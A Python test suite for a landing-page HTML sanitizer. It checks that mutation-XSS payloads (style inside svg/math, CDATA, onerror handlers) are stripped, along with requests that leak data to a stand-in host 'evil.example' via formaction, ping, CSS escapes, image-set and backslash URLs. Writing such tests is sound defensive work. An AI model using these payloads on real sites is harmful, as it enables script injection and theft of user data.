"""The landing-page sanitizer against what browsers parse differently.

html.parser reads <style> and <script> as raw text everywhere and keeps
CDATA sections whole; a browser parses <style> inside <svg>/<math> as
markup and ends CDATA in HTML at the first ">". A stored page must run
nothing and load nothing but Google Fonts, also through form actions on
buttons, pings, CSS escapes, image-set(), backslash URLs and preloads.
"""

import json

from apps.agent.subagents.html_sanitize import sanitize_html


def _clean(body: str, head: str = "") -> tuple[str, list[str]]:
    page = (f"<!DOCTYPE html><html><head><title>t</title>{head}</head>"
            f"<body>{body}</body></html>")
    result = sanitize_html(page)
    assert result.error is None
    return result.html, [w["path"] for w in result.warnings]


def _tags_inside(html: str, tag: str) -> list[str]:
    """The text of every <tag> element, as stored."""
    out, rest = [], html
    while f"<{tag}" in rest:
        rest = rest.split(f"<{tag}", 1)[1].split(">", 1)[1]
        body, rest = rest.split(f"</{tag}>", 1)
        out.append(body)
    return out


def test_style_inside_svg_or_math_cannot_open_a_tag():
    for body in ("<svg><style><img src=x onerror=alert(1)></style></svg>",
                 "<math><style><img src=x onerror=alert(2)></style></math>",
                 "<math><mtext><table><mglyph><style><img src=x onerror=alert(5)></style>"
                 "</mglyph></table></mtext></math>"):
        html, paths = _clean(body)
        assert all("<" not in css for css in _tags_inside(html, "style")), html
        assert "style" in paths


def test_cdata_declarations_and_processing_instructions_are_removed():
    html, paths = _clean("<![CDATA[><img src=x onerror=alert(3)>]]><p>after</p>")
    assert "onerror" not in html and "CDATA" not in html and "<p>after</p>" in html
    assert "document" in paths
    html, _ = _clean("<?xml-stylesheet href='https://evil.example/x.css'?><p>after</p>")
    assert "evil.example" not in html and "<p>after</p>" in html


def test_structured_data_cannot_carry_markup():
    html, _ = _clean('<svg><script type="application/ld+json">'
                     '{"name": "<img src=x onerror=alert(4)>", "by": "Tom & Jerry"}'
                     "</script></svg>")
    data = _tags_inside(html, "script")[0]
    assert "<" not in data and ">" not in data and "&" not in data
    assert json.loads(data) == {"name": "<img src=x onerror=alert(4)>", "by": "Tom & Jerry"}


def test_button_form_actions_and_pings_are_removed():
    html, paths = _clean('<form><input name="email"><button formaction="https://evil.example/c">'
                         'Go</button><input type="submit" formaction="//evil.example/d"></form>'
                         '<a href="/x" ping="https://evil.example/ping">x</a>')
    assert "evil.example" not in html and "formaction" not in html and "ping=" not in html
    assert {"form", "a[ping]"} <= set(paths)


def test_css_loads_are_caught_through_escapes_image_set_and_cut_off_urls():
    for style in (
        "background-image:image-set('https://evil.example/p.png' 1x)",
        "background:-webkit-image-set(url(https://evil.example/a.png) 1x)",
        r"background:\75 rl(https://evil.example/p.png)",
        "background:url(https://evil.example/p.png",
        "background:cross-fade('https://evil.example/p.png', red)",
    ):
        html, paths = _clean(f'<div style="{style}">x</div>')
        assert "evil.example" not in html, style
        assert "style" in paths
    html, _ = _clean(r"<style>@\69mport url(https://evil.example/x.css); .a{color:red}</style>")
    assert "evil.example" not in html and ".a{color:red}" in html


def test_urls_are_read_the_way_browsers_read_them():
    html, paths = _clean('<img src="/\\evil.example/p.png"><img src="/\t/evil.example/q.png">'
                         '<img src="https:evil.example/r.png">')
    assert "evil.example" not in html
    assert "img[src]" in paths
    html, _ = _clean("", head='<link rel="stylesheet" href="/\\evil.example/x.css">'
                              '<link rel="stylesheet" href="https://evil.example\\@fonts.'
                              'googleapis.com/css2">'
                              '<link rel="preload" as="image" href="" '
                              'imagesrcset="https://evil.example/p.png 1x">')
    assert "evil.example" not in html


def test_what_a_good_page_uses_is_kept_as_written():
    css = ('.a{background:url("data:image/png;base64,AAAA")} .b{fill:url(#g)} '
           '.c::after{content:"<"} @media (width < 600px){.d{color:red}} .md\\:flex{display:flex}')
    html, paths = _clean('<svg role="img"><title>Logo</title><use href="#icon"/></svg>'
                         '<a href="https://northwind.example/pricing">Pricing</a>',
                         head='<link rel="stylesheet" href="https://fonts.googleapis.com/css2?'
                              f'family=Inter&display=swap"><style>{css}</style>')
    assert paths == []
    assert f"<style>{css}</style>" in html
    assert 'href="https://fonts.googleapis.com/css2?family=Inter&amp;display=swap"' in html
    assert 'href="https://northwind.example/pricing"' in html and 'href="#icon"' in html
